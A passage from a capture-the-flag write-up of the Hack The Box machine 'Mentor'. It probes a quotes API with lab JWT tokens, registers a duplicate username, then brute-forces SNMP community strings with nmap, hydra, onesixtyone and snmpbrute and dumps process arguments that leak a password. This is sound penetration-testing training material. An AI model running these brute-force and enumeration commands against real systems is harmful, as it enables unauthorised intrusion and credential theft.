<span class="n">content</span><span class="o">-</span><span class="n">length</span><span class="p">:</span> <span class="mi">54</span>
<span class="n">content</span><span class="o">-</span><span class="nb">type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">json</span>
</pre></div>
</div>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">&quot;detail&quot;</span><span class="p">:</span><span class="s2">&quot;Only admin users can access this resource&quot;</span><span class="p">}</span>
</pre></div>
</div>
<p>quotes</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-sX<span class="w"> </span><span class="s1">&#39;GET&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="s1">&#39;http://api.mentorquotes.htb/quotes/&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;accept: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InpvaW5rZXJzIiwiZW1haWwiOiJ6b2lua3NAbWVudG9ycXVvdGVzLmh0YiJ9.Bh1vCttx8SfgZ89fN-51AHW5pwzh_14bt6JnWMJ02EM&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="p">|</span><span class="se">\</span>
jq<span class="w"> </span><span class="s2">&quot;.&quot;</span>
</pre></div>
</div>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">[</span>
<span class="w">  </span><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;title&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot; I believed I was good&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;I was so bad at studies in school. Teachers used to tell me that I should follow a different passion other than typical education. Nonetheless, I got rid of the negativity in myself and others and worked as hard as I could in my finals and college education. Now I am a paid accountant for a major brand in my country.&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
<span class="w">  </span><span class="p">},</span>
<span class="w">  </span><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;title&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Find your passion before its too late&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;When I was growing up, I did not really have much, sure I enjoyed my passion but did not take it seriously. When I worked in a gas station for 3 years at that point I made a decision to go back to education and get a masters degree. Now I am a senior content engineer for a reputed company&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span>
<span class="w">  </span><span class="p">},</span>
<span class="w">  </span><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;title&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Never too late&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;I was a construction worker for almost 10 years. I had to work there because I did not have any educational background to work in the academic sector. But I realized I was not getting the best of my life. So I started investing in crypto. Learned about how investing is done professionally. Soon enough I was able to give up the construction sector and start my own business. I did all this in my 60s&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span>
<span class="w">  </span><span class="p">},</span>
<span class="w">  </span><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;title&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Age is just a number&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;When I was was kid, I used to create very simple video games as a hobby. Because I loved it so much, I thought to myself that I am going to be a game developer someday. With self-motivation, I applied for a job as a game designer when I just finished school. Now I work there as a permanent video game developer. And I am really proud to be the youngest employee there.&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span>
<span class="w">  </span><span class="p">},</span>
<span class="w">  </span><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;title&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Its all worth it in the end&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Working as a school teacher, I had a lot of responsibilities to fulfill. Even though I really loved teaching kids, the pressure was unbearable. I had 10-hour shifts at school including all the extra classes. But I did all of them to support the kids who needed my help. Now I am retired and I can not think of anything else that I would have done except this. When I see the kids I teach come and visit me telling how they enjoyed my teaching, all the hard work I put in is worth it.&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">]</span>
</pre></div>
</div>
<p>Only admin can create new quotes</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-siX<span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="s1">&#39;http://api.mentorquotes.htb/quotes/&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;accept: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InpvaW5rZXJzIiwiZW1haWwiOiJ6b2lua3NAbWVudG9ycXVvdGVzLmh0YiJ9.Bh1vCttx8SfgZ89fN-51AHW5pwzh_14bt6JnWMJ02EM&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{</span>
<span class="s1">  &quot;title&quot;: &quot;zoink&quot;,</span>
<span class="s1">  &quot;description&quot;: &quot;zoink&quot;</span>
<span class="s1">}&#39;</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">403</span> <span class="n">Forbidden</span>
<span class="n">Date</span><span class="p">:</span> <span class="n">Sun</span><span class="p">,</span> <span class="mi">19</span> <span class="n">Feb</span> <span class="mi">2023</span> <span class="mi">11</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">48</span> <span class="n">GMT</span>
<span class="n">Server</span><span class="p">:</span> <span class="n">uvicorn</span>
<span class="n">content</span><span class="o">-</span><span class="n">length</span><span class="p">:</span> <span class="mi">54</span>
<span class="n">content</span><span class="o">-</span><span class="nb">type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">json</span>

<span class="p">{</span><span class="s2">&quot;detail&quot;</span><span class="p">:</span><span class="s2">&quot;Only admin users can access this resource&quot;</span><span class="p">}</span>
</pre></div>
</div>
<p>And we also can’t update the existing ones</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-siX<span class="w"> </span><span class="s1">&#39;PUT&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="s1">&#39;http://api.mentorquotes.htb/quotes/1/&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;accept: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InpvaW5rZXJzIiwiZW1haWwiOiJ6b2lua3NAbWVudG9ycXVvdGVzLmh0YiJ9.Bh1vCttx8SfgZ89fN-51AHW5pwzh_14bt6JnWMJ02EM&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{</span>
<span class="s1">  &quot;title&quot;: &quot;zoink&quot;,</span>
<span class="s1">  &quot;description&quot;: &quot;zoink&quot;</span>
<span class="s1">}&#39;</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">403</span> <span class="n">Forbidden</span>
<span class="n">Date</span><span class="p">:</span> <span class="n">Sun</span><span class="p">,</span> <span class="mi">19</span> <span class="n">Feb</span> <span class="mi">2023</span> <span class="mi">11</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mi">10</span> <span class="n">GMT</span>
<span class="n">Server</span><span class="p">:</span> <span class="n">uvicorn</span>
<span class="n">content</span><span class="o">-</span><span class="n">length</span><span class="p">:</span> <span class="mi">54</span>
<span class="n">content</span><span class="o">-</span><span class="nb">type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">json</span>

<span class="p">{</span><span class="s2">&quot;detail&quot;</span><span class="p">:</span><span class="s2">&quot;Only admin users can access this resource&quot;</span><span class="p">}</span>
</pre></div>
</div>
<p>Nor delete them</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-siX<span class="w"> </span><span class="s1">&#39;DELETE&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="s1">&#39;http://api.mentorquotes.htb/quotes/1/&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;accept: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InpvaW5rZXJzIiwiZW1haWwiOiJ6b2lua3NAbWVudG9ycXVvdGVzLmh0YiJ9.Bh1vCttx8SfgZ89fN-51AHW5pwzh_14bt6JnWMJ02EM&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{</span>
<span class="s1">  &quot;title&quot;: &quot;zoink&quot;,</span>
<span class="s1">  &quot;description&quot;: &quot;zoink&quot;</span>
<span class="s1">}&#39;</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">403</span> <span class="n">Forbidden</span>
<span class="n">Date</span><span class="p">:</span> <span class="n">Sun</span><span class="p">,</span> <span class="mi">19</span> <span class="n">Feb</span> <span class="mi">2023</span> <span class="mi">12</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">11</span> <span class="n">GMT</span>
<span class="n">Server</span><span class="p">:</span> <span class="n">uvicorn</span>
<span class="n">content</span><span class="o">-</span><span class="n">length</span><span class="p">:</span> <span class="mi">54</span>
<span class="n">content</span><span class="o">-</span><span class="nb">type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">json</span>

<span class="p">{</span><span class="s2">&quot;detail&quot;</span><span class="p">:</span><span class="s2">&quot;Only admin users can access this resource&quot;</span><span class="p">}</span>
</pre></div>
</div>
<p>Looks like we can’t reregister an email address that was already taken</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-sX<span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="s1">&#39;http://api.mentorquotes.htb/auth/signup&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;accept: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{</span>
<span class="s1">  &quot;email&quot;: &quot;james@mentorquotes.htb&quot;,</span>
<span class="s1">  &quot;username&quot;: &quot;james&quot;,</span>
<span class="s1">  &quot;password&quot;: &quot;zoinkers&quot;</span>
<span class="s1">}&#39;</span><span class="w"> </span><span class="p">|</span><span class="se">\</span>
jq<span class="w"> </span><span class="s2">&quot;.&quot;</span><span class="sb">```</span>
<span class="sb">```</span>json
<span class="o">{</span>
<span class="w">  </span><span class="s2">&quot;detail&quot;</span>:<span class="w"> </span><span class="s2">&quot;User already exists! &quot;</span>
<span class="o">}</span>
</pre></div>
</div>
<p>But we can reregister a username that was already taken</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-sX<span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="s1">&#39;http://api.mentorquotes.htb/auth/signup&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;accept: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{</span>
<span class="s1">  &quot;email&quot;: &quot;zarfl@mentorquotes.htb&quot;,</span>
<span class="s1">  &quot;username&quot;: &quot;james&quot;,</span>
<span class="s1">  &quot;password&quot;: &quot;zoinkers&quot;</span>
<span class="s1">}&#39;</span><span class="w"> </span><span class="p">|</span><span class="se">\</span>
jq<span class="w"> </span><span class="s2">&quot;.&quot;</span>
</pre></div>
</div>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">9</span><span class="p">,</span>
<span class="w">  </span><span class="nt">&quot;email&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;zarfl@mentorquotes.htb&quot;</span><span class="p">,</span>
<span class="w">  </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;james&quot;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>Which means we can be admin?
We get a token as james but it does give us admin access ..</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-sX<span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="s1">&#39;http://api.mentorquotes.htb/auth/login&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;accept: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{</span>
<span class="s1">  &quot;email&quot;: &quot;zarfl@mentorquotes.htb&quot;,</span>
<span class="s1">  &quot;username&quot;: &quot;james&quot;,</span>
<span class="s1">  &quot;password&quot;: &quot;zoinkers&quot;</span>
<span class="s1">  }&#39;</span><span class="w"> </span><span class="p">|</span><span class="se">\</span>
jq<span class="w"> </span>-r<span class="w"> </span><span class="s2">&quot;.&quot;</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><span class="o">.</span><span class="n">eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJ6YXJmbEBtZW50b3JxdW90ZXMuaHRiIn0</span><span class="o">.</span><span class="n">ku</span><span class="o">-</span><span class="n">JMFuwxawl19mDjN2rEJ1LzSjtx_08qBNzrXaMeSY</span>
</pre></div>
</div>
<p>I got stuck about there on this one</p>
</section>
<section id="snmp-enum">
<h2>SNMP Enum<a class="headerlink" href="#snmp-enum" title="Permalink to this heading">#</a></h2>
<p>Now watching ippsec’s video, he found the snmp port open while doing a UDP nmap scan in the background, we could also have gotten this info quick with the <code class="docutils literal notranslate"><span class="pre">--min-rate</span></code> argument</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">10000</span><span class="w"> </span><span class="m">10</span>.10.11.193<span class="w"> </span>-oN<span class="w"> </span>scans/nmap.udp
sudo<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p161<span class="w"> </span><span class="m">10</span>.10.11.193<span class="w"> </span>-oN<span class="w"> </span>scans/nmap.udp-detect
sudo<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span>--script<span class="w"> </span>snmp-brute<span class="w"> </span>-p161<span class="w"> </span><span class="m">10</span>.10.11.193
<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>blnkn:
Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-03-11<span class="w"> </span><span class="m">18</span>:08<span class="w"> </span>GMT
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>mentorquotes.htb<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.11.193<span class="o">)</span>
Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.045s<span class="w"> </span>latency<span class="o">)</span>.

PORT<span class="w">    </span>STATE<span class="w"> </span>SERVICE
<span class="m">161</span>/udp<span class="w"> </span>open<span class="w">  </span>snmp
<span class="p">|</span><span class="w"> </span>snmp-brute:
<span class="p">|</span>_<span class="w">  </span>public<span class="w"> </span>-<span class="w"> </span>Valid<span class="w"> </span>credentials

Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">2</span>.20<span class="w"> </span>seconds
</pre></div>
</div>
<p>From the version detection in nmap we already know that <code class="docutils literal notranslate"><span class="pre">public</span></code> community string is valid be don’t get much info from that. so looking at hacktricks we try hydra and onsixtyone, and that doesn’t really find anything else for some reason</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>hydra<span class="w"> </span>-P<span class="w"> </span>/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt<span class="w"> </span>-v<span class="w"> </span><span class="m">10</span>.10.11.193<span class="w"> </span>snmp
Hydra<span class="w"> </span>v9.4<span class="w"> </span><span class="o">(</span>c<span class="o">)</span><span class="w"> </span><span class="m">2022</span><span class="w"> </span>by<span class="w"> </span>van<span class="w"> </span>Hauser/THC<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>David<span class="w"> </span>Maciejak<span class="w"> </span>-<span class="w"> </span>Please<span class="w"> </span><span class="k">do</span><span class="w"> </span>not<span class="w"> </span>use<span class="w"> </span><span class="k">in</span><span class="w"> </span>military<span class="w"> </span>or<span class="w"> </span>secret<span class="w"> </span>service<span class="w"> </span>organizations,<span class="w"> </span>or<span class="w"> </span><span class="k">for</span><span class="w"> </span>illegal<span class="w"> </span>purposes<span class="w"> </span><span class="o">(</span>this<span class="w"> </span>is<span class="w"> </span>non-binding,<span class="w"> </span>these<span class="w"> </span>***<span class="w"> </span>ignore<span class="w"> </span>laws<span class="w"> </span>and<span class="w"> </span>ethics<span class="w"> </span>anyway<span class="o">)</span>.

Hydra<span class="w"> </span><span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span><span class="w"> </span>starting<span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-03-11<span class="w"> </span><span class="m">18</span>:10:41
<span class="o">[</span>DATA<span class="o">]</span><span class="w"> </span>max<span class="w"> </span><span class="m">16</span><span class="w"> </span>tasks<span class="w"> </span>per<span class="w"> </span><span class="m">1</span><span class="w"> </span>server,<span class="w"> </span>overall<span class="w"> </span><span class="m">16</span><span class="w"> </span>tasks,<span class="w"> </span><span class="m">118</span><span class="w"> </span>login<span class="w"> </span>tries<span class="w"> </span><span class="o">(</span>l:1/p:118<span class="o">)</span>,<span class="w"> </span>~8<span class="w"> </span>tries<span class="w"> </span>per<span class="w"> </span>task
<span class="o">[</span>DATA<span class="o">]</span><span class="w"> </span>attacking<span class="w"> </span>snmp://10.10.11.193:161/
<span class="o">[</span>VERBOSE<span class="o">]</span><span class="w"> </span>Resolving<span class="w"> </span>addresses<span class="w"> </span>...<span class="w"> </span><span class="o">[</span>VERBOSE<span class="o">]</span><span class="w"> </span>resolving<span class="w"> </span><span class="k">done</span>
<span class="o">[</span><span class="m">161</span><span class="o">][</span>snmp<span class="o">]</span><span class="w"> </span>host:<span class="w"> </span><span class="m">10</span>.10.11.193<span class="w">   </span>password:<span class="w"> </span>public
<span class="o">[</span>STATUS<span class="o">]</span><span class="w"> </span>attack<span class="w"> </span>finished<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.10.11.193<span class="w"> </span><span class="o">(</span>valid<span class="w"> </span>pair<span class="w"> </span>found<span class="o">)</span>
<span class="m">1</span><span class="w"> </span>of<span class="w"> </span><span class="m">1</span><span class="w"> </span>target<span class="w"> </span>successfully<span class="w"> </span>completed,<span class="w"> </span><span class="m">1</span><span class="w"> </span>valid<span class="w"> </span>password<span class="w"> </span>found
Hydra<span class="w"> </span><span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span><span class="w"> </span>finished<span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-03-11<span class="w"> </span><span class="m">18</span>:10:41
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>onesixtyone<span class="w"> </span>-c<span class="w"> </span>/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt<span class="w"> </span><span class="m">10</span>.10.11.193
Scanning<span class="w"> </span><span class="m">1</span><span class="w"> </span>hosts,<span class="w"> </span><span class="m">122</span><span class="w"> </span>communities
<span class="m">10</span>.10.11.193<span class="w"> </span><span class="o">[</span>public<span class="o">]</span><span class="w"> </span>Linux<span class="w"> </span>mentor<span class="w"> </span><span class="m">5</span>.15.0-56-generic<span class="w"> </span><span class="c1">#62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64</span>
<span class="m">10</span>.10.11.193<span class="w"> </span><span class="o">[</span>public<span class="o">]</span><span class="w"> </span>Linux<span class="w"> </span>mentor<span class="w"> </span><span class="m">5</span>.15.0-56-generic<span class="w"> </span><span class="c1">#62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64</span>
</pre></div>
</div>
<p>But snmpbrute finds the community string <code class="docutils literal notranslate"><span class="pre">internal</span></code></p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>snmpbrute.py<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>.10.11.193
<span class="w">   </span>_____<span class="w"> </span>_<span class="w">   </span>____<span class="w">  </span>_______<span class="w">     </span>____<span class="w">             </span>__
<span class="w">  </span>/<span class="w"> </span>___//<span class="w"> </span><span class="p">|</span><span class="w"> </span>/<span class="w"> </span>/<span class="w">  </span><span class="p">|</span>/<span class="w">  </span>/<span class="w"> </span>__<span class="w"> </span><span class="se">\ </span><span class="w">  </span>/<span class="w"> </span>__<span class="w"> </span><span class="o">)</span>_______<span class="w">  </span>__/<span class="w"> </span>/____
<span class="w">  </span><span class="se">\_</span>_<span class="w"> </span><span class="se">\/</span><span class="w">  </span><span class="p">|</span>/<span class="w"> </span>/<span class="w"> </span>/<span class="p">|</span>_/<span class="w"> </span>/<span class="w"> </span>/_/<span class="w"> </span>/<span class="w">  </span>/<span class="w"> </span>__<span class="w">  </span>/<span class="w"> </span>___/<span class="w"> </span>/<span class="w"> </span>/<span class="w"> </span>/<span class="w"> </span>__/<span class="w"> </span>_<span class="w"> </span><span class="se">\</span>
<span class="w"> </span>___/<span class="w"> </span>/<span class="w"> </span>/<span class="p">|</span><span class="w">  </span>/<span class="w"> </span>/<span class="w">  </span>/<span class="w"> </span>/<span class="w"> </span>____/<span class="w">  </span>/<span class="w"> </span>/_/<span class="w"> </span>/<span class="w"> </span>/<span class="w">  </span>/<span class="w"> </span>/_/<span class="w"> </span>/<span class="w"> </span>/_/<span class="w">  </span>__/
/____/_/<span class="w"> </span><span class="p">|</span>_/_/<span class="w">  </span>/_/_/<span class="w">      </span>/_____/_/<span class="w">   </span><span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

SNMP<span class="w"> </span>Bruteforce<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>Enumeration<span class="w"> </span>Script<span class="w"> </span>v2.0
http://www.secforce.com<span class="w"> </span>/<span class="w"> </span>nikos.vassakis<span class="w"> </span>&lt;at&gt;<span class="w"> </span>secforce.com
<span class="c1">###############################################################</span>
SNIP
Identified<span class="w"> </span>Community<span class="w"> </span>strings
<span class="w">        </span><span class="m">0</span><span class="o">)</span><span class="w"> </span><span class="m">10</span>.10.11.193<span class="w">    </span>internal<span class="w"> </span><span class="o">(</span>v2c<span class="o">)(</span>RO<span class="o">)</span>
<span class="w">        </span><span class="m">1</span><span class="o">)</span><span class="w"> </span><span class="m">10</span>.10.11.193<span class="w">    </span>public<span class="w"> </span><span class="o">(</span>v1<span class="o">)(</span>RO<span class="o">)</span>
<span class="w">        </span><span class="m">2</span><span class="o">)</span><span class="w"> </span><span class="m">10</span>.10.11.193<span class="w">    </span>public<span class="w"> </span><span class="o">(</span>v2c<span class="o">)(</span>RO<span class="o">)</span>
<span class="w">        </span><span class="m">3</span><span class="o">)</span><span class="w"> </span><span class="m">10</span>.10.11.193<span class="w">    </span>public<span class="w"> </span><span class="o">(</span>v1<span class="o">)(</span>RO<span class="o">)</span>
<span class="w">        </span><span class="m">4</span><span class="o">)</span><span class="w"> </span><span class="m">10</span>.10.11.193<span class="w">    </span>public<span class="w"> </span><span class="o">(</span>v2c<span class="o">)(</span>RO<span class="o">)</span>
Select<span class="w"> </span>Community<span class="w"> </span>to<span class="w"> </span>Enumerate<span class="w"> </span><span class="o">[</span><span class="m">0</span><span class="o">]</span>:^C
</pre></div>
</div>
<p>So we dump it with <code class="docutils literal notranslate"><span class="pre">snmpbulkwalk</span></code></p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>snmpbulkwalk<span class="w"> </span>-c<span class="w"> </span>internal<span class="w"> </span>-v2c<span class="w"> </span><span class="m">10</span>.10.11.193<span class="p">|</span>tee<span class="w"> </span>~/sec/htb/machines/mentor/scans/snmp.txt
</pre></div>
</div>
<p>And foraging through all that data we can find a password provided as an argument in the cmdline</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>STRING:<span class="w"> </span><span class="s2">&quot;-d -s&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.796<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.899<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.904<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;--foreground&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.905<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;/usr/bin/networkd-dispatcher --run-startup-triggers&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.906<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;--no-debug&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.907<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-n -iNONE&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1217<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-f -P&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1219<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f&quot;</span>
